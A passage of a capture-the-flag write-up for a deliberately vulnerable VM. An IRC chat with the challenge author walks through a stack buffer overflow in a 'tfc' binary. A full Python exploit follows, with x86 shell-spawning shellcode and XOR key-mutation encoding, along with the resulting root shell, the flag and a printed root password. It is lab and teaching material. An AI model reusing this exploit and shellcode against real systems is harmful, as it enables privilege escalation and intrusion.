+[2014-10-10T23:34:21+0100] <c0ne> try 6000 A
+[2014-10-10T23:34:25+0100] <c0ne> for a test
+[2014-10-10T23:34:41+0100] <c0ne> the original buffer is 4096
+[2014-10-10T23:34:50+0100] <c0ne> now that very close to that 5000
+[2014-10-10T23:35:26+0100] <c0ne> ooh btw
+[2014-10-10T23:35:33+0100] <c0ne> i see a bug in your code
+[2014-10-10T23:35:42+0100] <c0ne> for ( j = 0; j <= 7; ++j )
+[2014-10-10T23:35:48+0100] <c0ne> 0 ..7 is 8
+[2014-10-10T23:35:50+0100] <c0ne> rounds
+[2014-10-10T23:35:56+0100] <c0ne> for j in range(7):
+[2014-10-10T23:36:00+0100] <c0ne> this is 7 rounds
+[2014-10-10T23:36:29+0100] <c0ne> j <= 7
+[2014-10-10T23:36:35+0100] <c0ne> less or equal
+[2014-10-10T23:36:47+0100] <recrudesce> but it starts at 0
+[2014-10-10T23:36:49+0100] <c0ne> if it did j < 7 it would be 7 rounds
+[2014-10-10T23:37:07+0100] <recrudesce> so i need to do 6 then
+[2014-10-10T23:37:13+0100] <c0ne> no
+[2014-10-10T23:37:17+0100] <c0ne> 8
+[2014-10-10T23:37:23+0100] <c0ne> for j in range(8)
+[2014-10-10T23:37:36+0100] <c0ne> that will go from 0 .. up till 7
+[2014-10-10T23:37:40+0100] <c0ne> which is 8 rounds
+[2014-10-10T23:37:49+0100] <c0ne> since the 0 counts to
+[2014-10-10T23:38:09+0100] <recrudesce> segfault at 41414141
+[2014-10-10T23:38:09+0100] <recrudesce> nice
+[2014-10-10T23:38:25+0100] <c0ne> now from here on i made it easy
+[2014-10-10T23:38:30+0100] <c0ne> exec stack
+[2014-10-10T23:38:38+0100] <c0ne> and even added some little helper
+[2014-10-10T23:40:14+0100] <recrudesce> so it's one way encryption
+[2014-10-10T23:40:19+0100] <recrudesce> but you can encrypt encrypted files to decrypt
+[2014-10-10T23:40:23+0100] <recrudesce> hahaha
+[2014-10-10T23:40:26+0100] <c0ne> yes
+[2014-10-10T23:40:27+0100] <c0ne> xor
+[2014-10-10T23:40:36+0100] <c0ne> with a key mutation
+[2014-10-10T23:40:53+0100] <c0ne> if i used a static key of for example 16 bytes
+[2014-10-10T23:41:06+0100] <c0ne> you could see some pattern in the encrypted data
+[2014-10-10T23:41:14+0100] <c0ne> kinda revealing the key
+[2014-10-10T23:41:24+0100] <c0ne> so that why added a bit of math
+[2014-10-10T23:43:04+0100] <c0ne> you can also make it leak the key
+[2014-10-10T23:43:12+0100] <c0ne> feed it a file with 00 bytes
+[2014-10-10T23:45:34+0100] <recrudesce> eip is at 4124
+[2014-10-10T23:46:29+0100] <c0ne> yes
+[2014-10-10T23:48:06+0100] <recrudesce> ok, have control of EIP
+[2014-10-10T23:49:35+0100] <c0ne> now whats next ..
+[2014-10-10T23:50:04+0100] <recrudesce> ok, so ret2lib i guess ?
+[2014-10-10T23:50:13+0100] <c0ne> naah
+[2014-10-10T23:50:16+0100] <c0ne> even more simple
+[2014-10-10T23:50:29+0100] <c0ne> stack is executable
+[2014-10-10T23:50:38+0100] <c0ne> no need for fancy rops
+[2014-10-10T23:50:40+0100] <recrudesce> jump to esp
+[2014-10-10T23:50:46+0100] <c0ne> yeah
+[2014-10-10T23:52:15+0100] <c0ne> msfelfscan -j esp binaryfile
+[2014-10-10T23:53:55+0100] <c0ne> asm ("jmp %esp");
+[2014-10-10T23:54:00+0100] <c0ne> added it on purpose
+[2014-10-10T23:54:06+0100] <c0ne> i'm not that evil
+[2014-10-10T23:57:50+0100] <c0ne> since there isnt any more tricks down the way
+```
+
+So, now that you read that, this is what my Python script looks like
+
+``` python
+#!/bin/python
+import sys
+import struct
+#a1 = file contents
+#a2 = file length
+
+#f = open('input_buff.tfc', 'r')
+#a1 = f.read()
+#a2 = len(a1)
+
+ret = '\x93\x8e\x04\x08' #08048d93
+shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
+a1 = 'A'*4124 + ret + '\x90' * 10 + shellcode
+l = len(a1) % 4
+for m in range(l):
+        a1 += 'Z'
+
+a2 = len(a1)
+
+key = 0xEA1AB19F
+r=''
+# now do the first for loop
+for i in range(a2/4):
+        x = struct.unpack_from('<L', a1, (i * 4))[0]
+        #print x ^ key
+        r += struct.pack('<L', (x ^ key))
+        for j in range(8):
+                if (key & 1):
+                        key = (key >> 1) ^ 0x6DAA1Cf4
+                else:
+                        key = key >> 1
+open('myfile.tfc', 'wb').write( r )
+```
+
+This generates a .tfc file, which when provided to the tfc application "decrypts", jumps to esp and executes the shellcode, dropping us to a shell.
+
+``` bash
+jason@knockknock:~$ python keyshow.py
+jason@knockknock:~$ ./tfc ./myfile.tfc ./myfile_blah.tfc
+# id
+uid=1000(jason) gid=1000(jason) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
+# cd /root
+# ls -l
+total 16
+-rw-r--r-- 1 root root 1459 Oct 11 18:04 crpt.py
+-rwxr-xr-x 1 root root 1027 Oct 10 18:19 server.py
+-rwxr-xr-x 1 root root  119 Sep 26 12:10 start.sh
+drwxr-xr-x 2 root root 4096 Oct 10 20:55 the_flag_is_in_here
+# cd the_flag_is_in_here
+ls -l
+# total 4
+-rw-r--r-- 1 root root 895 Oct 10 20:55 qQcmDWKM5a6a3wyT.txt
+# cat qQcmDWKM5a6a3wyT.txt
+ __                         __              __                         __      ____
+|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
+|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
+|    <|   |  (  <_> )  \___|    <  /_____/ |    <|   |  (  <_> )  \___|    <   |   |
+|__|_ \___|  /\____/ \___  >__|_ \         |__|_ \___|  /\____/ \___  >__|_ \  |___|
+     \/    \/            \/     \/              \/    \/            \/     \/       
+
+Hooray you got the flag!
+
+Hope you had as much fun r00ting this as I did making it!
+
+Feel free to hit me up in #vulnhub @ zer0w1re
+
+Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
+as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)
+
+root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
+#
+```
+
+![](http://halloffamejay.com/wp-content/uploads/2013/10/muppet.gif)
